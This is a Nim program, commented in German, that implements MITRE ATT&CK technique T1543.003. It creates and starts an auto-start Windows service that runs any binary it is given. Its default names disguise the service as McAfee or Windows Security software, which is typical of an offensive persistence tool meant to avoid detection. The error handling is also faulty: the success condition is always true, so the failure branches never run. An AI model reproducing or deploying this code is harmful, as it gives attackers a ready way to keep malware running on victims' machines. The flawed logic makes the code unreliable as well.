#[
    Erstellt einen windows prozess der dann beliebigen Code ausführt.
    Link: https://attack.mitre.org/techniques/T1543/003/

    Usage:
        service.exe [servicename] [service_path]
    Default:
        service_path: McAfee-PN-Servicename C:\\Program Files\\Windows Security\\BrowserCore.exe
]#

import os
import strformat
import winim
import winim/inc/winsvc

var
    DISPLAYNAME: string

proc createWinService(SERVICENAME: string, path: string) =
    DISPLAYNAME = fmt("{SERVICENAME}-DPN")

    echo "[+] Creating a service."
    var scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)
    var serviceCreation = CreateService(
        scmHandle,
        L(SERVICENAME),
        L(DISPLAYNAME),
        SC_MANAGER_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, # https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-changeserviceconfiga
        SERVICE_ERROR_NORMAL,
        path,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        )

    if serviceCreation != ERROR_ACCESS_DENIED or serviceCreation != ERROR_INVALID_HANDLE:
        echo "[+] Services was successfully created"
        var args: DWORD = 0
        var started = StartService(serviceCreation, args, NULL)
        if started:
            echo "[+] Services started successfully"
        else:
            echo "[-] Services started unsuccessfully"
    elif serviceCreation == ERROR_SERVICE_EXISTS or serviceCreation == ERROR_DUPLICATE_SERVICE_NAME:
        echo "[-] Service allready exists"
    else:
        echo "[-] Unable to create the service"

    var closeServiceValue = CloseServiceHandle(serviceCreation)

    if closeServiceValue != 0:
        echo "[+] Servicehandle was successfully closed"
    else:
       echo "[-] Unable to close the servicehandle"



if isMainModule:

  if paramCount() > 0:
      createWinService(paramStr(1), fmt("\"{paramStr(2)}\""))
  else:
      echo "usage: createService.exe <servicename> <path-to-binary>"
